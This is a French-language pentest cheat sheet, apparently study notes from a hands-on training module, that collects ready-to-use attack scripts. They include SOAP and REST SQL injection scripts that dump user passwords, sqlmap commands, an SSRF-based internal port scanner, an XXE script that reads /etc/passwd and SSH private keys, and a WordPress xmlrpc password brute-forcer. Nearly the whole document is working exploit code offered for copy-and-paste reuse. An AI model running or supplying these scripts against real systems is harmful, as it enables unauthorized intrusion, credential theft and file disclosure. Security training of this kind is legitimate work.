# ⚙️ ARSENAL — Scripts SQLi & Automation

> Scripts réutilisables : SQLi SOAP (colonnes → dump), SQLi API, énumération d'IDs, scan de ports par SSRF, XXE. Copier-coller, adapter l'URL/les champs.

Lié : [[08 - SQL Injection]] · [[12 - SSRF]] · [[14 - XXE]] · [[15 - Arsenal Shells Python]]

---

## #1 — SQLi SOAP : trouver le nombre de colonnes ⭐

Le script qui a résolu le Skills Assessment. Teste automatiquement 1→N colonnes, distingue *hang* / erreur / réponse propre.

```python
#!/usr/bin/env python3
"""SQLi SOAP — auto column count. Usage: python3 soap_cols.py"""
import requests

URL = "http://TARGET:3002/wsdl"
NS  = "http://tempuri.org/"

def login(username, password="test", timeout=8):
    payload = (f'<?xml version="1.0" encoding="utf-8"?>'
        f'<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="{NS}">'
        f'<soap:Body><LoginRequest xmlns="{NS}">'
        f'<username>{username}</username><password>{password}</password>'
        f'</LoginRequest></soap:Body></soap:Envelope>')
    try:
        return requests.post(URL, data=payload,
                             headers={"SOAPAction": '"Login"'}, timeout=timeout).text
    except requests.exceptions.ReadTimeout:
        return "[HANG]"

for n in range(1, 11):
    nulls = ",".join(["NULL"] * n)
    inj = f"admin' UNION SELECT {nulls}-- -"
    out = login(inj)
    tag = "HANG" if out == "[HANG]" else ("ERROR" if "Error" in out or "error" in out else "OK ✅")
    print(f"[{n:>2} col] {tag}  {out[:120]}")
    print("-" * 50)
```
→ La ligne `OK ✅` (ni HANG ni ERROR) = le bon nombre de colonnes (5 dans le module).

---

## #2 — SQLi SOAP : identifier la colonne + dumper

```python
#!/usr/bin/env python3
"""SQLi SOAP — extraction. Adapter N (nb colonnes) et la requête."""
import requests, re

URL, NS, N = "http://TARGET:3002/wsdl", "http://tempuri.org/", 5

def login(username, password="test", timeout=8):
    payload = (f'<?xml version="1.0" encoding="utf-8"?>'
        f'<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="{NS}">'
        f'<soap:Body><LoginRequest xmlns="{NS}">'
        f'<username>{username}</username><password>{password}</password>'
        f'</LoginRequest></soap:Body></soap:Envelope>')
    try:
        return requests.post(URL, data=payload, headers={"SOAPAction": '"Login"'}, timeout=timeout).text
    except requests.exceptions.ReadTimeout:
        return "[HANG]"

# 1) marqueurs pour voir quelles colonnes s'affichent
markers = ",".join(f"'{i}'" for i in range(1, N + 1))
print("[*] Marqueurs :"); print(login(f"zzz' UNION SELECT {markers}-- -"))

# 2) dump : placer la donnée dans chaque colonne (ici les 5)
cols = "id,name,email,username,password"     # adapter aux vraies colonnes
inj  = f"zzz' UNION SELECT {cols} FROM users WHERE username='admin'-- -"
resp = login(inj)
print("\n[*] Réponse admin :"); print(resp)
m = re.search(r"<password>(.*?)</password>", resp)
if m: print(f"\n[+] PASSWORD = {m.group(1)}")
```

> Si `FROM users` échoue → énumérer via `sqlite_master` (SQLite) ou `information_schema` (MySQL). Voir [[08 - SQL Injection]].

---

## #3 — SQLi API REST (curl one-liner sûr)

Éviter l'enfer des espaces dans l'URL avec `-G` + `--data-urlencode` :
```bash
curl -G "http://TARGET:3003/" \
  --data-urlencode "id=0 UNION ALL SELECT NULL,username,NULL FROM users WHERE position=736373-- -"
```
Étapes : `id=1'` (confirmer) → `id=1 ORDER BY 3-- -` (colonnes) → `id=0 UNION SELECT 111,222,333-- -` (colonne affichée) → extraction.

---

## #4 — sqlmap sur SOAP (requête sauvegardée)

Sauver la requête SOAP dans un fichier avec `*` au point d'injection :
```
# soap_req.txt
POST /wsdl HTTP/1.1
Host: TARGET:3002
SOAPAction: "Login"
Content-Type: text/xml

<?xml version="1.0"?><soap:Envelope ...><soap:Body><LoginRequest xmlns="http://tempuri.org/"><username>admin*</username><password>test</password></LoginRequest></soap:Body></soap:Envelope>
```
```bash
sqlmap -r soap_req.txt --dump -T users --batch
```
Sur API REST : `sqlmap -u "http://TARGET:3003/?id=1" --dump -T users --batch`

---

## #5 — Énumération d'IDs (info disclosure)

```python
import requests, sys
base = sys.argv[1]                       # http://TARGET:3003
for val in range(1, 10000):
    r = requests.get(f"{base}/?id={val}")
    if "position" in r.text:
        print(val, r.text.strip())
```

---

## #6 — Scan de ports interne par SSRF

Transforme la SSRF en scanner (voir [[12 - SSRF]]). Ouvert = timeout, fermé = réponse rapide.

```python
#!/usr/bin/env python3
import requests, base64

TARGET = "http://TARGET:3000/api/userinfo"
HOST   = "127.0.0.1"
PORTS  = [22, 80, 3000, 3001, 3002, 3306, 6379, 8080, 9999]

def b64url(port):
    return base64.b64encode(f"http://{HOST}:{port}".encode()).decode()

for p in PORTS:
    blob = b64url(p)
    try:
        r = requests.get(f"{TARGET}?id={blob}", timeout=4)
        # réponse rapide + "Cannot reach" = fermé
        state = "FERMÉ" if "Cannot reach" in r.text else "OUVERT (réponse)"
    except requests.exceptions.ReadTimeout:
        state = "OUVERT (hang/timeout)"    # connexion établie → l'API attend
    print(f"[{HOST}:{p:>5}] {state}")
```

---

## #7 — XXE : lecture de fichier in-band

```python
#!/usr/bin/env python3
import requests, re

URL = "http://TARGET:3001/api/login"

def read_file(path):
    payload = (f'<?xml version="1.0" encoding="UTF-8"?>'
        f'<!DOCTYPE pwn [<!ENTITY x SYSTEM "file://{path}"> ]>'
        f'<root><email>&x;</email><password>test</password></root>')
    r = requests.post(URL, data=payload, timeout=10)
    # l'app réfléchit l'email dans son message d'erreur → extraire
    m = re.search(r"account with\s*<b>(.*?)</b>", r.text, re.DOTALL)
    return m.group(1) if m else r.text

for f in ["/etc/passwd", "/etc/hostname", "/home/ubuntu/.ssh/id_rsa"]:
    print(f"=== {f} ===")
    print(read_file(f), "\n")
```

---

## #8 — Brute-force xmlrpc.php (WordPress)

```python
import requests

URL = "http://blog.cible.com/xmlrpc.php"
USER = "admin"
def try_pw(pw):
    data = (f"<methodCall><methodName>wp.getUsersBlogs</methodName><params>"
            f"<param><value>{USER}</value></param>"
            f"<param><value>{pw}</value></param></params></methodCall>")
    r = requests.post(URL, data=data)
    return "isAdmin" in r.text        # True = mdp correct

for pw in open("rockyou.txt", encoding="latin-1"):
    pw = pw.strip()
    if try_pw(pw):
        print(f"[+] TROUVÉ : {USER}:{pw}"); break
```
> ⚡ Version dévastatrice : `system.multicall` teste des centaines de mdp en 1 requête (cf. [[06 - WordPress xmlrpc]]).

Tags : #arsenal #sqli #ssrf #xxe #automation #python
